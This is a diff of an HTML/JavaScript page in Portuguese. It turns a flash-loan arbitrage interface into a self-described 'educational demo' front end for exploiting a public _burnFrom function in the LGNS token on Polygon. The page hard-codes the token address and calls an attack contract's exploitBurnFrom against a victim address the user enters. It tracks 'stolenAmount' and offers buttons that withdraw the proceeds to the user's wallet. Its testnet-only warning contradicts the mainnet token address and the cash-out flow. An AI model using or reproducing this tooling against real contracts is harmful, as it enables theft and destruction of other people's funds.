@@ -1,136 +1,816 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html lang="pt-br">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Flash Loan Executor</title>
-  <style>
-    body {
-      font-family: 'Segoe UI', sans-serif;
-      background: #111;
-      color: #eee;
-      margin: 0;
-      padding: 0;
-    }
-    .container {
-      max-width: 1000px;
-      margin: 0 auto;
-      padding: 30px;
-    }
-    h1 {
-      color: #00c896;
-    }
-    input, select, button {
-      padding: 10px;
-      margin: 5px 0;
-      border-radius: 5px;
-      border: none;
-    }
-    input, select {
-      width: 100%;
-    }
-    button {
-      background-color: #00c896;
-      color: white;
-      cursor: pointer;
-    }
-    button:hover {
-      background-color: #00b386;
-    }
-    .log {
-      background: #000;
-      color: #0f0;
-      padding: 15px;
-      font-family: monospace;
-      margin-top: 20px;
-      height: 200px;
-      overflow-y: scroll;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Demo Educacional - Vulnerabilidade Token LGNS</title>
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.6.0/dist/web3.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bignumber.js@9.1.0/bignumber.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 15px;
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+        }
+        
+        .warning {
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            border-radius: 10px;
+            padding: 15px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        
+        .warning h3 {
+            color: #856404;
+            margin-bottom: 10px;
+        }
+        
+        .section {
+            margin-bottom: 25px;
+            padding: 20px;
+            border: 2px solid #e9ecef;
+            border-radius: 10px;
+        }
+        
+        h1 {
+            text-align: center;
+            color: #333;
+            margin-bottom: 30px;
+            font-size: 2.2em;
+        }
+        
+        h2 {
+            color: #495057;
+            margin-bottom: 15px;
+            border-bottom: 2px solid #667eea;
+            padding-bottom: 5px;
+        }
+        
+        .input-group {
+            margin-bottom: 15px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+            color: #495057;
+        }
+        
+        input, button, select {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+        }
+        
+        input:focus, select:focus {
+            border-color: #667eea;
+            outline: none;
+        }
+        
+        button {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            cursor: pointer;
+            font-weight: bold;
+            transition: transform 0.2s;
+            margin-top: 10px;
+        }
+        
+        button:hover {
+            transform: translateY(-2px);
+        }
+        
+        button:disabled {
+            background: #6c757d;
+            cursor: not-allowed;
+            transform: none;
+        }
+        
+        .result {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 10px;
+            border-left: 4px solid #667eea;
+        }
+        
+        .status {
+            padding: 10px;
+            border-radius: 5px;
+            text-align: center;
+            font-weight: bold;
+            margin-bottom: 15px;
+        }
+        
+        .connected {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        
+        .disconnected {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+        
+        .info-box {
+            background: #e7f3ff;
+            border: 1px solid #b3d9ff;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 15px;
+        }
+        
+        .quick-actions {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin-top: 10px;
+        }
+        
+        .quick-btn {
+            padding: 8px;
+            font-size: 14px;
+        }
+        
+        .balance-display {
+            background: #d1ecf1;
+            border: 1px solid #bee5eb;
+            border-radius: 5px;
+            padding: 10px;
+            margin-top: 5px;
+            text-align: center;
+            font-weight: bold;
+        }
+    </style>
 </head>
 <body>
-<div class="container">
-  <h1>Flash Loan Arbitragem</h1>
-  <button id="connect">Conectar à MetaMask</button>
-  <div id="wallet">Carteira: não conectada</div>
+    <div class="container">
+        <h1>🔓 Demo Educacional - Vulnerabilidade Token LGNS</h1>
+        
+        <div class="warning">
+            <h3>⚠️ AVISO IMPORTANTE</h3>
+            <p>Esta é uma demonstração EDUCACIONAL para mostrar vulnerabilidades de segurança.</p>
+            <p><strong>NÃO USE EM REDE PRINCIPAL (MAINNET)</strong></p>
+            <p>Use apenas em redes de teste para fins de aprendizado.</p>
+        </div>
 
-  <h2>Parâmetros</h2>
-  <label>Endereço do contrato:</label>
-  <input type="text" id="contractAddress" placeholder="0x...">
+        <div class="section">
+            <h2>🔗 Conexão com a Rede</h2>
+            <div id="connectionStatus" class="status disconnected">
+                Desconectado da Rede Polygon
+            </div>
+            <button onclick="connectWallet()">Conectar Carteira</button>
+            <div class="info-box">
+                <strong>Endereço do Contrato Vulnerável:</strong><br>
+                0xeB51D9A39AD5EEF215dC0Bf39a8821ff804A0F01
+            </div>
+            
+            <div class="input-group">
+                <label>Seu Saldo de MATIC:</label>
+                <div id="maticBalance" class="balance-display">-</div>
+            </div>
+        </div>
 
-  <label>Endereço do Token Alvo:</label>
-  <input type="text" id="tokenAddress" placeholder="0x...">
+        <div class="section">
+            <h2>📊 Verificações de Segurança</h2>
+            
+            <div class="input-group">
+                <label>Endereço para Verificar Saldo LGNS:</label>
+                <input type="text" id="balanceAddress" placeholder="0x...">
+                <button onclick="checkBalance()">Verificar Saldo LGNS</button>
+                <div id="balanceResult" class="result"></div>
+            </div>
+            
+            <div class="input-group">
+                <label>Verificar Permissões (Allowance):</label>
+                <input type="text" id="ownerAddress" placeholder="Dono dos tokens (0x...)">
+                <input type="text" id="spenderAddress" placeholder="Quem tem permissão (0x...)" style="margin-top: 10px;">
+                <button onclick="checkAllowance()">Verificar Permissão</button>
+                <div id="allowanceResult" class="result"></div>
+            </div>
+        </div>
 
-  <label>Valor do empréstimo (MATIC):</label>
-  <input type="number" id="amount" placeholder="Ex: 5">
+        <div class="section">
+            <h2>🎯 Demonstração da Vulnerabilidade</h2>
+            <div class="info-box">
+                <strong>Vulnerabilidade:</strong> Função _burnFrom pública<br>
+                <strong>Risco:</strong> Permite queimar tokens de outros endereços
+            </div>
+            
+            <div class="input-group">
+                <label>Endereço do Contrato Vítima:</label>
+                <input type="text" id="victimAddress" placeholder="0x... (contrato com LGNS)">
+            </div>
+            
+            <div class="input-group">
+                <label>Quantidade de LGNS para Demonstrar:</label>
+                <div style="display: grid; grid-template-columns: 2fr 1fr; gap: 10px;">
+                    <input type="number" id="attackAmount" placeholder="Ex: 100" step="0.1" min="0.1">
+                    <select id="amountUnit">
+                        <option value="lgns">LGNS</option>
+                        <option value="wei">Wei</option>
+                    </select>
+                </div>
+                
+                <div class="quick-actions">
+                    <button class="quick-btn" onclick="setAmount(1)">1 LGNS</button>
+                    <button class="quick-btn" onclick="setAmount(10)">10 LGNS</button>
+                    <button class="quick-btn" onclick="setAmount(100)">100 LGNS</button>
+                    <button class="quick-btn" onclick="setAmount(1000)">1000 LGNS</button>
+                </div>
+            </div>
+            
+            <button onclick="executeDemo()" id="demoButton">Executar Demonstração</button>
+            <div id="demoResult" class="result"></div>
+        </div>
 
-  <button id="executar">Executar Arbitragem</button>
+        <div class="section">
+            <h2>💰 Gerenciamento de Fundos</h2>
+            
+            <div class="input-group">
+                <label>Seu Saldo de LGNS no Contrato de Ataque:</label>
+                <div id="contractBalance" class="balance-display">-</div>
+                <button onclick="checkContractBalance()">Atualizar Saldo</button>
+            </div>
+            
+            <div class="quick-actions">
+                <button onclick="withdrawTokens()" class="quick-btn">Retirar LGNS para Minha Carteira</button>
+                <button onclick="withdrawFunds()" class="quick-btn">Retirar MATIC</button>
+            </div>
+        </div>
 
-  <div class="log" id="logs"></div>
-</div>
+        <div class="section">
+            <h2>📝 Contrato de Ataque</h2>
+            <div id="contractInfo" class="result">
+                Aguardando implantação do contrato...
+            </div>
+            
+            <div class="input-group">
+                <label>Endereço do Seu Contrato (se já implantado):</label>
+                <input type="text" id="contractAddress" placeholder="0x... (cole aqui se já tiver contrato)">
+                <button onclick="connectExistingContract()">Conectar ao Contrato Existente</button>
+            </div>
+            
+            <button onclick="deployContract()" id="deployButton">Implantar Novo Contrato Demo</button>
+        </div>
+    </div>
 
-<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-<script>
-  const abi = [
-    "function startArbitrage(uint256 amount, address specificToken) external",
-    "function addTargetToken(address token) external",
-    "function getTargetTokens() view returns (address[])",
-    "event OperationExecuted(address indexed token, uint256 amount, uint256 profit)"
-  ];
+    <script>
+        let web3;
+        let userAccount;
+        let attackContract;
+        let attackContractAddress;
 
-  let provider, signer, contract;
+        // ABI do Contrato de Ataque (mesmo do anterior)
+        const ATTACK_ABI = [
+            {
+                "inputs": [],
+                "stateMutability": "nonpayable",
+                "type": "constructor"
+            },
+            {
+                "anonymous": false,
+                "inputs": [
+                    {
+                        "indexed": true,
+                        "internalType": "address",
+                        "name": "victim",
+                        "type": "address"
+                    },
+                    {
+                        "indexed": false,
+                        "internalType": "uint256",
+                        "name": "amount",
+                        "type": "uint256"
+                    }
+                ],
+                "name": "AttackExecuted",
+                "type": "event"
+            },
+            {
+                "anonymous": false,
+                "inputs": [
+                    {
+                        "indexed": true,
+                        "internalType": "address",
+                        "name": "from",
+                        "type": "address"
+                    },
+                    {
+                        "indexed": false,
+                        "internalType": "uint256",
+                        "name": "amount",
+                        "type": "uint256"
+                    }
+                ],
+                "name": "FundsReceived",
+                "type": "event"
+            },
+            {
+                "inputs": [],
+                "name": "VULNERABLE_TOKEN",
+                "outputs": [
+                    {
+                        "internalType": "address",
+                        "name": "",
+                        "type": "address"
+                    }
+                ],
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "inputs": [],
+                "name": "attackExecuted",
+                "outputs": [
+                    {
+                        "internalType": "bool",
+                        "name": "",
+                        "type": "bool"
+                    }
+                ],
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "inputs": [
+                    {
+                        "internalType": "address",
+                        "name": "victimContract",
+                        "type": "address"
+                    },
+                    {
+                        "internalType": "uint256",
+                        "name": "amount",
+                        "type": "uint256"
+                    }
+                ],
+                "name": "exploitBurnFrom",
+                "outputs": [],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "inputs": [],
+                "name": "owner",
+                "outputs": [
+                    {
+                        "internalType": "address",
+                        "name": "",
+                        "type": "address"
+                    }
+                ],
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "inputs": [],
+                "name": "stolenAmount",
+                "outputs": [
+                    {
+                        "internalType": "uint256",
+                        "name": "",
+                        "type": "uint256"
+                    }
+                ],
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "inputs": [
+                    {
+                        "internalType": "address",
+                        "name": "account",
+                        "type": "address"
+                    }
+                ],
+                "name": "checkBalance",
+                "outputs": [
+                    {
+                        "internalType": "uint256",
+                        "name": "",
+                        "type": "uint256"
+                    }
+                ],
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "inputs": [
+                    {
+                        "internalType": "address",
+                        "name": "owner",
+                        "type": "address"
+                    },
+                    {
+                        "internalType": "address",
+                        "name": "spender",
+                        "type": "address"
+                    }
+                ],
+                "name": "checkAllowance",
+                "outputs": [
+                    {
+                        "internalType": "uint256",
+                        "name": "",
+                        "type": "uint256"
+                    }
+                ],
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "inputs": [],
+                "name": "withdrawFunds",
+                "outputs": [],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "inputs": [],
+                "name": "withdrawTokens",
+                "outputs": [],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "stateMutability": "payable",
+                "type": "receive"
+            }
+        ];
 
-  const log = msg => {
-    const logs = document.getElementById("logs");
-    logs.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}<br>`;
-    logs.scrollTop = logs.scrollHeight;
-  };
+        // ABI simplificada do Token Vulnerável
+        const TOKEN_ABI = [
+            {
+                "constant": false,
+                "inputs": [
+                    {"name": "account_", "type": "address"},
+                    {"name": "amount_", "type": "uint256"}
+                ],
+                "name": "_burnFrom",
+                "outputs": [],
+                "type": "function"
+            },
+            {
+                "constant": true,
+                "inputs": [{"name": "account", "type": "address"}],
+                "name": "balanceOf",
+                "outputs": [{"name": "", "type": "uint256"}],
+                "type": "function"
+            },
+            {
+                "constant": true,
+                "inputs": [
+                    {"name": "owner", "type": "address"},
+                    {"name": "spender", "type": "address"}
+                ],
+                "name": "allowance",
+                "outputs": [{"name": "", "type": "uint256"}],
+                "type": "function"
+            },
+            {
+                "constant": false,
+                "inputs": [
+                    {"name": "spender", "type": "address"},
+                    {"name": "amount", "type": "uint256"}
+                ],
+                "name": "approve",
+                "outputs": [{"name": "", "type": "bool"}],
+                "type": "function"
+            }
+        ];
 
-  document.getElementById("connect").onclick = async () => {
-    if (typeof window.ethereum !== 'undefined') {
-      try {
-        await window.ethereum.request({ method: 'eth_requestAccounts' });
-        provider = new ethers.providers.Web3Provider(window.ethereum);
-        signer = provider.getSigner();
-        const address = await signer.getAddress();
-        document.getElementById("wallet").textContent = "Carteira: " + address;
-        log("Carteira conectada: " + address);
-      } catch (err) {
-        log("Erro ao conectar carteira: " + err.message);
-      }
-    } else {
-      alert("MetaMask não encontrada. Instale a extensão no navegador.");
-    }
-  };
+        const VULNERABLE_TOKEN = "0xeB51D9A39AD5EEF215dC0Bf39a8821ff804A0F01";
 
-  document.getElementById("executar").onclick = async () => {
-    const contractAddr = document.getElementById("contractAddress").value;
-    const token = document.getElementById("tokenAddress").value;
-    const amount = document.getElementById("amount").value;
-    if (!contractAddr || !token || !amount) return alert("Preencha todos os campos.");
+        // Funções para facilitar o uso
+        function setAmount(amount) {
+            document.getElementById('attackAmount').value = amount;
+        }
 
-    if (!signer) {
-      return alert("Conecte a carteira primeiro.");
-    }
+        function convertToWei(amount, unit) {
+            if (unit === 'wei') {
+                return amount;
+            }
+            // LGNS tem 9 decimais (conforme o contrato)
+            return new BigNumber(amount).times(1e9).toString();
+        }
 
-    contract = new ethers.Contract(contractAddr, abi, signer);
-    const parsedAmount = ethers.utils.parseEther(amount);
+        function convertFromWei(amount) {
+            return new BigNumber(amount).dividedBy(1e9).toString();
+        }
 
-    try {
-      log("Adicionando token alvo...");
-      const tx1 = await contract.addTargetToken(token);
-      await tx1.wait();
-      log("Token adicionado.");
+        async function connectWallet() {
+            try {
+                if (window.ethereum) {
+                    web3 = new Web3(window.ethereum);
+                    await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    const accounts = await web3.eth.getAccounts();
+                    userAccount = accounts[0];
+                    
+                    document.getElementById('connectionStatus').className = 'status connected';
+                    document.getElementById('connectionStatus').innerHTML = 
+                        `Conectado: ${userAccount.substring(0, 6)}...${userAccount.substring(38)}`;
+                    
+                    // Atualizar saldo de MATIC
+                    await updateMaticBalance();
+                    
+                    // Verificar se já tem contrato salvo
+                    const savedContract = localStorage.getItem('attackContractAddress');
+                    if (savedContract) {
+                        document.getElementById('contractAddress').value = savedContract;
+                        await connectExistingContract();
+                    }
+                    
+                } else {
+                    alert('Por favor, instale o MetaMask!');
+                }
+            } catch (error) {
+                console.error('Erro ao conectar:', error);
+                alert('Erro ao conectar carteira: ' + error.message);
+            }
+        }
 
-      log("Executando arbitragem...");
-      const tx2 = await contract.startArbitrage(parsedAmount, token);
-      log("Transação enviada: " + tx2.hash);
-      await tx2.wait();
-      log("Flash Loan executado.");
-    } catch (e) {
-      log("Erro: " + e.message);
-    }
-  };
-</script>
+        async function updateMaticBalance() {
+            if (!web3 || !userAccount) return;
+            
+            try {
+                const balance = await web3.eth.getBalance(userAccount);
+                const maticBalance = web3.utils.fromWei(balance, 'ether');
+                document.getElementById('maticBalance').innerHTML = `${parseFloat(maticBalance).toFixed(4)} MATIC`;
+            } catch (error) {
+                console.error('Erro ao buscar saldo:', error);
+            }
+        }
+
+        async function connectExistingContract() {
+            const contractAddress = document.getElementById('contractAddress').value;
+            
+            if (!web3 || !userAccount) {
+                alert('Conecte sua carteira primeiro!');
+                return;
+            }
+
+            if (!contractAddress) {
+                alert('Digite o endereço do contrato!');
+                return;
+            }
+
+            try {
+                attackContractAddress = contractAddress;
+                attackContract = new web3.eth.Contract(ATTACK_ABI, attackContractAddress);
+                
+                // Verificar se é dono do contrato
+                const owner = await attackContract.methods.owner().call();
+                if (owner.toLowerCase() !== userAccount.toLowerCase()) {
+                    alert('AVISO: Você não é o dono deste contrato!');
+                }
+                
+                document.getElementById('contractInfo').innerHTML = 
+                    `<strong>Contrato Conectado:</strong><br>${attackContractAddress}<br>
+                     <strong>Dono:</strong> ${owner}`;
+                
+                // Salvar no localStorage
+                localStorage.setItem('attackContractAddress', contractAddress);
+                
+                // Atualizar saldo do contrato
+                await checkContractBalance();
+                
+            } catch (error) {
+                console.error('Erro ao conectar contrato:', error);
+                alert('Erro ao conectar contrato: ' + error.message);
+            }
+        }
+
+        async function deployContract() {
+            if (!web3 || !userAccount) {
+                alert('Conecte sua carteira primeiro!');
+                return;
+            }
+
+            try {
+                document.getElementById('deployButton').disabled = true;
+                document.getElementById('deployButton').innerText = 'Implantando...';
+
+                // Nota: Você precisa compilar o contrato e colocar o bytecode aqui
+                const contractBytecode = 'SEU_BYTECODE_AQUI'; // Substituir pelo bytecode real
+                
+                if (contractBytecode === 'SEU_BYTECODE_AQUI') {
+                    alert('Por favor, compile o contrato e insira o bytecode no código!');
+                    return;
+                }
+
+                const contract = new web3.eth.Contract(ATTACK_ABI);
+                
+                const deployTx = contract.deploy({
+                    data: contractBytecode
+                });
+
+                const gasEstimate = await deployTx.estimateGas({ from: userAccount });
+                
+                const deployedContract = await deployTx.send({
+                    from: userAccount,
+                    gas: gasEstimate
+                });
+
+                attackContractAddress = deployedContract.options.address;
+                attackContract = new web3.eth.Contract(ATTACK_ABI, attackContractAddress);
+                
+                document.getElementById('contractInfo').innerHTML = 
+                    `<strong>Contrato Implantado:</strong><br>${attackContractAddress}`;
+                
+                document.getElementById('contractAddress').value = attackContractAddress;
+                localStorage.setItem('attackContractAddress', attackContractAddress);
+                
+                document.getElementById('deployButton').innerText = 'Contrato Implantado!';
+                
+                await checkContractBalance();
+                
+            } catch (error) {
+                console.error('Erro na implantação:', error);
+                alert('Erro ao implantar contrato: ' + error.message);
+                document.getElementById('deployButton').disabled = false;
+                document.getElementById('deployButton').innerText = 'Implantar Contrato Demo';
+            }
+        }
+
+        async function checkBalance() {
+            if (!web3) {
+                alert('Conecte sua carteira primeiro!');
+                return;
+            }
+
+            const address = document.getElementById('balanceAddress').value;
+            if (!address) {
+                alert('Digite um endereço!');
+                return;
+            }
+
+            try {
+                const tokenContract = new web3.eth.Contract(TOKEN_ABI, VULNERABLE_TOKEN);
+                const balance = await tokenContract.methods.balanceOf(address).call();
+                const balanceInLGNS = convertFromWei(balance);
+                
+                document.getElementById('balanceResult').innerHTML = 
+                    `Saldo: ${parseFloat(balanceInLGNS).toLocaleString('pt-BR')} LGNS<br>
+                     <small>(${balance} wei)</small>`;
+            } catch (error) {
+                console.error('Erro:', error);
+                document.getElementById('balanceResult').innerHTML = 'Erro ao verificar saldo';
+            }
+        }
+
+        async function checkAllowance() {
+            if (!web3) {
+                alert('Conecte sua carteira primeiro!');
+                return;
+            }
+
+            const owner = document.getElementById('ownerAddress').value;
+            const spender = document.getElementById('spenderAddress').value;
+            
+            if (!owner || !spender) {
+                alert('Preencha ambos os endereços!');
+                return;
+            }
+
+            try {
+                const tokenContract = new web3.eth.Contract(TOKEN_ABI, VULNERABLE_TOKEN);
+                const allowance = await tokenContract.methods.allowance(owner, spender).call();
+                const allowanceInLGNS = convertFromWei(allowance);
+                
+                document.getElementById('allowanceResult').innerHTML = 
+                    `Permissão: ${parseFloat(allowanceInLGNS).toLocaleString('pt-BR')} LGNS<br>
+                     <small>(${allowance} wei)</small>`;
+            } catch (error) {
+                console.error('Erro:', error);
+                document.getElementById('allowanceResult').innerHTML = 'Erro ao verificar permissão';
+            }
+        }
+
+        async function checkContractBalance() {
+            if (!web3 || !attackContract) {
+                alert('Conecte ao contrato primeiro!');
+                return;
+            }
+
+            try {
+                const balance = await attackContract.methods.checkBalance(attackContractAddress).call();
+                const balanceInLGNS = convertFromWei(balance);
+                
+                document.getElementById('contractBalance').innerHTML = 
+                    `${parseFloat(balanceInLGNS).toLocaleString('pt-BR')} LGNS`;
+            } catch (error) {
+                console.error('Erro:', error);
+                document.getElementById('contractBalance').innerHTML = 'Erro ao verificar saldo';
+            }
+        }
+
+        async function executeDemo() {
+            if (!web3 || !userAccount || !attackContract) {
+                alert('Conecte carteira e contrato primeiro!');
+                return;
+            }
+
+            const victimAddress = document.getElementById('victimAddress').value;
+            const amount = document.getElementById('attackAmount').value;
+            const unit = document.getElementById('amountUnit').value;
+            
+            if (!victimAddress || !amount) {
+                alert('Preencha todos os campos!');
+                return;
+            }
+
+            try {
+                document.getElementById('demoButton').disabled = true;
+                document.getElementById('demoButton').innerText = 'Executando...';
+
+                const amountInWei = convertToWei(amount, unit);
+                
+                // Executa a demonstração do ataque
+                await attackContract.methods.exploitBurnFrom(victimAddress, amountInWei)
+                    .send({ from: userAccount });
+                
+                document.getElementById('demoResult').innerHTML = 
+                    '✅ Demonstração executada com sucesso!<br>' +
+                    `Vítima: ${victimAddress}<br>` +
+                    `Quantidade: ${parseFloat(amount).toLocaleString('pt-BR')} LGNS<br>
+                     <small>Transação confirmada - Tokens queimados do contrato vítima</small>`;
+                
+                // Atualizar saldo do contrato
+                await checkContractBalance();
+                
+            } catch (error) {
+                console.error('Erro na demonstração:', error);
+                document.getElementById('demoResult').innerHTML = 
+                    '❌ Erro na demonstração: ' + error.message;
+            } finally {
+                document.getElementById('demoButton').disabled = false;
+                document.getElementById('demoButton').innerText = 'Executar Demonstração';
+            }
+        }
+
+        async function withdrawTokens() {
+            if (!web3 || !userAccount || !attackContract) {
+                alert('Conecte carteira e contrato primeiro!');
+                return;
+            }
+
+            try {
+                await attackContract.methods.withdrawTokens().send({ from: userAccount });
+                alert('✅ LGNS retirados para sua carteira!');
+                await checkContractBalance();
+            } catch (error) {
+                console.error('Erro ao retirar tokens:', error);
+                alert('Erro ao retirar tokens: ' + error.message);
+            }
+        }
+
+        async function withdrawFunds() {
+            if (!web3 || !userAccount || !attackContract) {
+                alert('Conecte carteira e contrato primeiro!');
+                return;
+            }
+
+            try {
+                await attackContract.methods.withdrawFunds().send({ from: userAccount });
+                alert('✅ MATIC retirados para sua carteira!');
+                await updateMaticBalance();
+            } catch (error) {
+                console.error('Erro ao retirar fundos:', error);
+                alert('Erro ao retirar fundos: ' + error.message);
+            }
+        }
+
+        // Inicialização
+        window.addEventListener('load', async () => {
+            if (window.ethereum) {
+                web3 = new Web3(window.ethereum);
+            }
+        });
+    </script>
 </body>
 </html>
